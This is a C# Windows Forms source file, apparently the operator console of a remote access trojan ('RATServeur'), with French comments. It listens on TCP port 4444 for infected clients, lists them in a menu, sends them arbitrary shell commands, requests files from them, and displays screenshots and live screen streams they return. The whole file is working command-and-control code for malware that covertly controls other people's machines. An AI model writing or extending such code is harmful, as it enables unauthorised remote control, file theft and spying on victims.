using Global;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Global.Fonction;

namespace RATServeur
{
    public class Home : Form
    {
        private TcpListener server;  //Serveur TCP pour écouter les connexions entrantes
        private readonly List<TcpClient> clients;  //Liste de tous les clients connectés
        private TcpClient client = null; //un client

        private readonly List<Thread> threads;  //Liste des threads pour chaque client

        private readonly List<NetworkStream> streams;  //Liste des flux réseau pour chaque client
        private NetworkStream stream; //flux du client
        private readonly Thread listenThread;  //Thread pour écouter les connexions clients de manière asynchrone
        private string clientSelected;  //le nom du client selectionner

        private string lastCmdResponse = "Chargement..."; //la dernier response des cmd
        private readonly object lockCmdResponse = new object(); //Pour gérer la synchronisation

        //fenetre posiblement ouverte
        private Cmd? clientCmd;
        private File? clientFile;
        private FormStream? clientFormStream;

        private MenuStrip menuStrip1;
        private ToolStripMenuItem clientToolStripMenuItem;
        private ToolStripMenuItem cmdToolStripMenuItem;
        private ToolStripMenuItem fileToolStripMenuItem;
        private ToolStripMenuItem screenToolStripMenuItem;
        private Label terminal;
        private Panel panel1;
        private Label information;
        private SplitContainer splitContainer1;
        private ToolStripMenuItem streamToolStripMenuItem;

        public Home()
        {
            InitializeComponent();
            Init();

            // Démarrage d'un thread pour écouter les connexions entrantes des clients
            listenThread = new Thread(new ThreadStart(StartServer))
            {
                IsBackground = true // Exécution en tâche de fond
            };
            listenThread.Start(); // Démarrage du thread d'écoute

            clients = new List<TcpClient>();
            streams = new List<NetworkStream>();
            threads = new List<Thread>();
        }
        private void Init()
        {
            // Gestion de la fermeture de la fenêtre
            FormClosing += new FormClosingEventHandler(OnFormClosing);
            // Événement déclenché quand la page est charger
            Load += BackgroundTask;
            Resize += Main_Resize;
        }

        private void Main_Resize(object sender, EventArgs e)
        {
            splitContainer1.Size = ClientSize - new Size(0, 40);
            splitContainer1.SplitterDistance = 2 * ClientSize.Width / 3;
        }

        /// <summary>
        /// tache fait en arriere plans permetant d'afficher la fenetre avant la fin
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void BackgroundTask(object sender, EventArgs e)
        {
            /*
            BackgroundWorker worker = new BackgroundWorker(); //permet d'exécuter des tâches en arrière-plan sans bloquer l'interface utilisateur
            worker.DoWork += (s, args) => Always();  //processus a lancer
            worker.RunWorkerAsync(); //lance le processus*/
        }


        /// <summary>
        /// lance le server
        /// </summary>
        private void StartServer()
        {
            try
            {
                // Création du serveur pour écouter les connexions TCP sur le port 4444
                server = new TcpListener(IPAddress.Any, 4444);
                server.Start(); //demarge du serv

                while (true)
                {
                    terminal.Text += "En attente de connexion...\n";
                    try
                    {
                        client = server.AcceptTcpClient(); // Attente d'une connexion client
                        clients.Add(client);  // Ajout du client à la liste des clients connectés

                        terminal.Text += "Client connecté !\n";

                        stream = client.GetStream(); // Récupération du flux réseau pour ce client
                        streams.Add(stream);  // Ajout du flux à la liste des flux

                        // Ajout du client à la ListView avec l'adresse IP du client
                        string clientName = client.Client.RemoteEndPoint.ToString();  // Récupération de l'adresse IP du client

                        ToolStripMenuItem newClientToolStripItem = new ToolStripMenuItem
                        {
                            Text = clientName
                        };
                        newClientToolStripItem.Click += NewClientSelected;

                        clientToolStripMenuItem.DropDownItems.Add(newClientToolStripItem);

                        // Démarrage d'un thread pour gérer la communication avec ce client
                        Thread clientThread = new Thread(() => HandleClient(client, stream))
                        {
                            IsBackground = true  // Exécution en tâche de fond
                        };
                        clientThread.Start();  // Démarrage du thread de gestion du client
                        lock (threads)
                        {
                            threads.Add(clientThread);
                        }
                    }
                    catch (Exception ex)
                    {
                        foreach (var client in clients)
                        {
                            client.Close();  // Fermeture de chaque client
                        }
                        server?.Stop();
                        terminal.Text += "Erreur : " + ex.Message + "\n";
                    }
                }
            }
            catch (Exception ex)
            {
                terminal.Text += "Erreur Serveur : " + ex.Message + "\n";
            }
        }

        /// <summary>
        /// action lors de la selection d'un client
        /// </summary>
        /// <param name="sender">information sur l'object</param>
        /// <param name="e">information sur l'evenement</param>
        private void NewClientSelected(object sender, EventArgs e)
        {
            if (!(((ToolStripItem)sender).Text == clientSelected))
            {
                clientSelected = ((ToolStripItem)sender).Text;

                BackgroundWorker worker = new BackgroundWorker(); //permet d'exécuter des tâches en arrière-plan sans bloquer l'interface utilisateur
                worker.DoWork += (s, args) => LoadInfo();  //processus a lancer
                worker.RunWorkerAsync(); //lance le processus
            }
        }

        /// <summary>
        /// charge les info su client
        /// </summary>
        private void LoadInfo()
        {
            if (clientSelected != null)
            {
                information.Text = "client selectionner:\n";
                information.Text += $"id:{clientSelected}\n";
                lock (lockCmdResponse)
                {
                    lastCmdResponse = "Chargement..."; //pour pas avoir une vielle reponse
                }

                if (SendCommand("cd"))
                {

                    int timeout = 2000;
                    int waited = 0;
                    //limite une duree max
                    while (waited < timeout)
                    {
                        lock (lockCmdResponse)
                        {
                            if (lastCmdResponse != "Chargement...") break; //verifie un changement
                        }

                        Thread.Sleep(100); //pour pas surcharger
                        waited += 100;
                    }

                    information.Text += $"dir:{lastCmdResponse}\n";
                }
                else
                {
                    information.Text += $"dir:false\n";
                }
            }
        }



        /// <summary>
        /// gérer la communication avec un client spécifique
        /// </summary>
        /// <param name="client">le client</param>
        /// <param name="stream"></param>
        private void HandleClient(TcpClient client, NetworkStream stream)
        {
            try
            {
                string clientName = client.Client.RemoteEndPoint.ToString(); // Obtenir l'adresse du client
                // Boucle pour recevoir des données tant que le client est connecté
                while (client.Connected)
                {
                    byte[] buffer = new byte[3];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        string prefix = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        // Vérifier si c'est une capture d'écran (binaire) ou un texte (réponse de commande)
                        if (prefix == Prefix.CMD.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille
                            int size = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion en entier

                            byte[] reponse = new byte[size];  // Tableau pour contenir les données de l'image

                            bytesRead = 0;
                            // Lecture des données de l'image
                            //pas juste stream.Read pour etre sur de tout lire
                            while (bytesRead < size)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(reponse, bytesRead, size - bytesRead);
                            }
                            string repTxt = Encoding.UTF8.GetString(reponse, 0, bytesRead).Trim();
                            //sauvegarde de la reponse
                            lock (lockCmdResponse)
                            {
                                lastCmdResponse = repTxt;
                            }

                            //terminal.Text += $"{client.Client.RemoteEndPoint.ToString()}:\n";
                            //terminal.Text += repTxt + "\n";

                            clientCmd?.Invoke((MethodInvoker)(() =>
                            {
                                clientCmd.TerminalText += $"{clientSelected}:\n{repTxt}\n";
                            }));
                        }
                        else if (prefix == Prefix.IMG.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille de l'image
                            int imageSize = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                            byte[] imageData = new byte[imageSize];  // Tableau pour contenir les données de l'image
                            bytesRead = 0;
                            // Lecture des données de l'image
                            while (bytesRead < imageSize)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(imageData, bytesRead, imageSize - bytesRead);
                            }
                            using (MemoryStream ms = new MemoryStream(imageData))
                            {
                                Image img = Image.FromStream(ms);
                                if (clientSelected == clientName && clientFormStream != null)
                                {
                                    clientFormStream.Img = img;
                                }
                            }
                        }
                        else if (prefix == Prefix.FIL.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille
                            int size = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion en entier

                            byte[] reponse = new byte[size];  // Tableau pour contenir les données de l'image

                            bytesRead = 0;
                            // Lecture des données de l'image
                            //pas juste stream.Read pour etre sur de tout lire
                            while (bytesRead < size)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(reponse, bytesRead, size - bytesRead);
                            }
                            string file = Encoding.UTF8.GetString(reponse, 0, bytesRead).Trim();

                            clientFile?.ShowFile(file);
                        }
                    }
                    else
                    {
                        break;
                    }
                    /*
                    byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                        stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille de l'image
                        int imageSize = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                        byte[] imageData = new byte[imageSize];  // Tableau pour contenir les données de l'image
                        int bytesRead = 0;
                        // Lecture des données de l'image
                        while (bytesRead < imageSize)
                    {
                        // Lire les données du flux
                        bytesRead += stream.Read(imageData, bytesRead, imageSize - bytesRead);
                    }
                    /*
                    if (jack == 1)
                    {
                        string filePath = $"C:/Users/Nico/Pictures/screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
                        File.WriteAllBytes(filePath, imageData);
                        terminal.Text += $"Capture d'écran enregistrée : {filePath}";
                        jack = 0;
                    }

                    // Conversion des données de l'image en objet Image
                    using (MemoryStream ms = new MemoryStream(imageData))
                    {
                        // Créer l'image depuis le flux de données
                        Image img = Image.FromStream(ms);
                        // Vérifier si ce client est bien le client sélectionné avant d'afficher l'image
                        listViewClients.Invoke(new MethodInvoker(delegate
                        {
                            if (listViewClients.SelectedItems.Count > 0 &&
                                listViewClients.SelectedItems[0].Text == clientName)
                            {
                                pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height);
                            }
                        }));
                        // Mise à jour de l'image affichée dans la PictureBox
                        //pictureBox.Invoke(new MethodInvoker(delegate { pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height); }));
                    }*/

                }
            }
            catch (Exception ex)
            {
                terminal.Text += "Erreur Client : " + ex.Message + "\n";
            }
            finally
            {
                terminal.Text += $"{client.Client.RemoteEndPoint.ToString()} s'est deconnecter.\n";
                RemoveClient(client.Client.RemoteEndPoint.ToString());
            }
        }

        /// <summary>
        /// retire le client de la liste des possibiliter et refresh les infos si besoin
        /// </summary>
        /// <param name="clientName">le nom du client a suprimer</param>
        private void RemoveClient(string clientName)
        {
            for (int i = 0; i < clientToolStripMenuItem.DropDownItems.Count; i++)
            {
                if (clientToolStripMenuItem.DropDownItems[i] is ToolStripMenuItem toolStrip && toolStrip.Text == clientName)
                {
                    clientToolStripMenuItem.DropDownItems.RemoveAt(i);
                    clients.RemoveAt(i);
                    streams.RemoveAt(i);

                    lock (threads)
                    {
                        threads.RemoveAt(i);
                    }
                    break;
                }
            }


            if (clientSelected == clientName)
            {
                if (clientToolStripMenuItem.DropDownItems.Count > 0)
                {
                    clientSelected = clientToolStripMenuItem.DropDownItems[0].Text;
                    LoadInfo();
                }
                else
                {
                    clientSelected = null;
                    information.Text = "NOTHING";
                }
            }
            if (clientCmd != null)
            {
                clientCmd.TerminalText = "";
            }
        }

        /// <summary>
        /// envoie les commande au serveur
        /// </summary>
        /// <param name="command">la command</param>
        public bool SendCommand(string command)
        {
            if (clientSelected != null)
            {
                //obtien la position du client
                int clientIndex = 0;
                foreach (ToolStripMenuItem toolStrip in clientToolStripMenuItem.DropDownItems)
                {
                    if (toolStrip.Text == clientSelected)
                    {
                        break;
                    }
                    clientIndex++;
                }
                //Vérifie si l'index est valide
                if (clientIndex >= streams.Count)
                {
                    return false;
                }

                NetworkStream selectedStream = streams[clientIndex]; //obtien le flux du client

                //Vérifie si le stream est utilisable
                if (selectedStream == null || !selectedStream.CanWrite)
                {
                    return false;
                }

                if (!string.IsNullOrEmpty(command)) //si y a une commande
                {
                    byte[] data = Encoding.UTF8.GetBytes(command); //encode la commande

                    SendPrefix(Prefix.CMD, selectedStream);

                    SendSize(data, selectedStream); //envoie la taille de la commande

                    selectedStream.Write(data, 0, data.Length); //envoie la commande
                    selectedStream.Flush();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        public bool GetRemoteFile(string path)
        {
            if (clientSelected != null)
            {
                //obtien la position du client
                int clientIndex = 0;
                foreach (ToolStripMenuItem toolStrip in clientToolStripMenuItem.DropDownItems)
                {
                    if (toolStrip.Text == clientSelected)
                    {
                        break;
                    }
                    clientIndex++;
                }
                //Vérifie si l'index est valide
                if (clientIndex >= streams.Count)
                {
                    return false;
                }

                NetworkStream selectedStream = streams[clientIndex]; //obtien le flux du client


                //Vérifie si le stream est utilisable
                if (selectedStream == null || !selectedStream.CanWrite)
                {
                    return false;
                }

                if (!string.IsNullOrEmpty(path)) //si y a une commande
                {
                    byte[] data = Encoding.UTF8.GetBytes(path); //encode la commande

                    SendPrefix(Prefix.FIL, selectedStream);

                    SendSize(data, selectedStream); //envoie la taille de la commande

                    selectedStream.Write(data, 0, data.Length); //envoie la commande
                    selectedStream.Flush();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        /// <summary>
        /// appeler lors de la fermeture de la fenetre
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var client in clients)
            {
                // Effectuer un flush si nécessaire pour s'assurer que toutes les données sont envoyées
                stream.Flush();

                // Fermer proprement le stream et la connexion
                stream.Close();
                client.Close();  // Fermeture de chaque client
            }
            /*
            if (server != null)
            {
                server.Stop(); //arret du serv
            }*/

            server?.Stop();//arret du serv
            Application.Exit();
            Environment.Exit(0); // Forcer la fermeture complète
        }


        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            menuStrip1 = new MenuStrip();
            clientToolStripMenuItem = new ToolStripMenuItem();
            cmdToolStripMenuItem = new ToolStripMenuItem();
            fileToolStripMenuItem = new ToolStripMenuItem();
            screenToolStripMenuItem = new ToolStripMenuItem();
            streamToolStripMenuItem = new ToolStripMenuItem();
            terminal = new Label();
            panel1 = new Panel();
            information = new Label();
            splitContainer1 = new SplitContainer();
            menuStrip1.SuspendLayout();
            panel1.SuspendLayout();
            ((ISupportInitialize)splitContainer1).BeginInit();
            splitContainer1.Panel1.SuspendLayout();
            splitContainer1.Panel2.SuspendLayout();
            splitContainer1.SuspendLayout();
            SuspendLayout();
            // 
            // menuStrip1
            // 
            menuStrip1.ImageScalingSize = new Size(32, 32);
            menuStrip1.Items.AddRange(new ToolStripItem[] { clientToolStripMenuItem, cmdToolStripMenuItem, fileToolStripMenuItem, screenToolStripMenuItem });
            menuStrip1.Location = new Point(0, 0);
            menuStrip1.Name = "menuStrip1";
            menuStrip1.Padding = new Padding(6, 3, 0, 3);
            menuStrip1.Size = new Size(790, 42);
            menuStrip1.TabIndex = 0;
            menuStrip1.Text = "menuStrip1";
            // 
            // clientToolStripMenuItem
            // 
            clientToolStripMenuItem.Name = "clientToolStripMenuItem";
            clientToolStripMenuItem.Size = new Size(92, 36);
            clientToolStripMenuItem.Text = "client";
            // 
            // cmdToolStripMenuItem
            // 
            cmdToolStripMenuItem.Name = "cmdToolStripMenuItem";
            cmdToolStripMenuItem.Size = new Size(80, 36);
            cmdToolStripMenuItem.Text = "cmd";
            cmdToolStripMenuItem.Click += CmdToolStripMenuItem_Click;
            // 
            // fileToolStripMenuItem
            // 
            fileToolStripMenuItem.Name = "fileToolStripMenuItem";
            fileToolStripMenuItem.Size = new Size(67, 36);
            fileToolStripMenuItem.Text = "file";
            fileToolStripMenuItem.Click += FileToolStripMenuItem_Click;
            // 
            // screenToolStripMenuItem
            // 
            screenToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { streamToolStripMenuItem });
            screenToolStripMenuItem.Name = "screenToolStripMenuItem";
            screenToolStripMenuItem.Size = new Size(103, 36);
            screenToolStripMenuItem.Text = "screen";
            // 
            // streamToolStripMenuItem
            // 
            streamToolStripMenuItem.Name = "streamToolStripMenuItem";
            streamToolStripMenuItem.Size = new Size(219, 44);
            streamToolStripMenuItem.Text = "stream";
            streamToolStripMenuItem.Click += StreamToolStripMenuItem_Click;
            // 
            // terminal
            // 
            terminal.AutoSize = true;
            terminal.Location = new Point(0, 0);
            terminal.Name = "terminal";
            terminal.Size = new Size(107, 32);
            terminal.TabIndex = 0;
            terminal.Text = "terminal:\n";
            // 
            // panel1
            // 
            panel1.AutoScroll = true;
            panel1.Controls.Add(terminal);
            panel1.Dock = DockStyle.Fill;
            panel1.Location = new Point(0, 0);
            panel1.Margin = new Padding(3, 4, 3, 4);
            panel1.Name = "panel1";
            panel1.Size = new Size(391, 593);
            panel1.TabIndex = 2;
            // 
            // information
            // 
            information.Dock = DockStyle.Fill;
            information.Location = new Point(0, 0);
            information.Name = "information";
            information.Size = new Size(395, 593);
            information.TabIndex = 1;
            information.Text = "client selectionner:\n";
            // 
            // splitContainer1
            // 
            splitContainer1.Dock = DockStyle.Fill;
            splitContainer1.Location = new Point(0, 42);
            splitContainer1.Margin = new Padding(3, 4, 3, 4);
            splitContainer1.Name = "splitContainer1";
            // 
            // splitContainer1.Panel1
            // 
            splitContainer1.Panel1.Controls.Add(information);
            // 
            // splitContainer1.Panel2
            // 
            splitContainer1.Panel2.Controls.Add(panel1);
            splitContainer1.Size = new Size(790, 593);
            splitContainer1.SplitterDistance = 395;
            splitContainer1.TabIndex = 3;
            // 
            // Home
            // 
            AutoScaleDimensions = new SizeF(13F, 32F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(790, 635);
            Controls.Add(splitContainer1);
            Controls.Add(menuStrip1);
            Margin = new Padding(3, 4, 3, 4);
            Name = "Home";
            Text = "Main";
            menuStrip1.ResumeLayout(false);
            menuStrip1.PerformLayout();
            panel1.ResumeLayout(false);
            panel1.PerformLayout();
            splitContainer1.Panel1.ResumeLayout(false);
            splitContainer1.Panel2.ResumeLayout(false);
            ((ISupportInitialize)splitContainer1).EndInit();
            splitContainer1.ResumeLayout(false);
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion


        private void CmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientCmd?.Close();
            clientCmd = new Cmd(this);
            clientCmd.Show(); //affiche et oblige a rester sur lui
        }
        private void FileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientFile?.Close();
            clientFile = new File(this);
            clientFile.Show(); //affiche et oblige a rester sur lui
        }

        private void StreamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientFormStream?.Close();
            clientFormStream = new FormStream(Properties.Resources.nothing);
            clientFormStream.Show(); //affiche et oblige a rester sur lui
        }
    }
}
